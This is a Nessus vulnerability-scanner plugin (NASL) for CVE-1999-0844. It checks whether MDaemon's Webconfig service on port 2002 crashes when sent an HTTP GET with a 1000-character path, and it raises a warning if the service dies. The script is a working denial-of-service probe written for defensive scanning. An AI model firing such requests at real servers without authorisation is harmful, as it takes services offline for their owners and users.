#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10138);
 script_bugtraq_id(820);
 script_version ("$Revision: 1.12 $");
 script_cve_id("CVE-1999-0844");
 name["english"] = "MDaemon Webconfig crash";
 name["francais"] = "Plantage de Webconfig de MDaemon";
 script_name(english:name["english"], francais:name["francais"]);
 
 desc["english"] = "It was possible to crash the 
remote Webconfig, used to configure Mdaemon
by sending the request :

	GET /aaaaa[...]aaa HTTP/1.0
	
	

This problem allows an attacker to prevent you
from configuring the mdaemon server remotely.

Solution : contact your vendor for a fix.

Risk factor : Medium";


 desc["francais"] = "Il s'est avéré possible de faire
planter le service Webconfig de mdaemon, utilisé
pour configurer ce serveur à distance.

Ce problème permet à des pirates de vous
empecher de configurer mdaemon à distance.

Solution : contactez votre vendeur pour un patch.

Facteur de risque : Moyen.";

 script_description(english:desc["english"], francais:desc["francais"]);
 
 summary["english"] = "Crashes the remote service";
 summary["francais"] = "Fait planter le service distant";
 script_summary(english:summary["english"], francais:summary["francais"]);
 
 script_category(ACT_DENIAL);
 
 
 script_copyright(english:"This script is Copyright (C) 1999 Renaud Deraison",
		francais:"Ce script est Copyright (C) 1999 Renaud Deraison");
 family["english"] = "Denial of Service";
 family["francais"] = "Déni de service";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes", "httpver.nasl");
 script_require_ports(2002);
 exit(0);
}

#
# The script code starts here
#

include("http_func.inc");

port = 2002;
if(get_port_state(port))
{
 if(http_is_dead(port:port))exit(0);
 
 soc = http_open_socket(port);
 if(soc)
 {
  data = http_get(item:crap(1000), port:port);
  send(socket:soc, data:data);
  r = http_recv(socket:soc);
  http_close_socket(soc);
  
  if(http_is_dead(port:port))security_warning(port);
 }
}
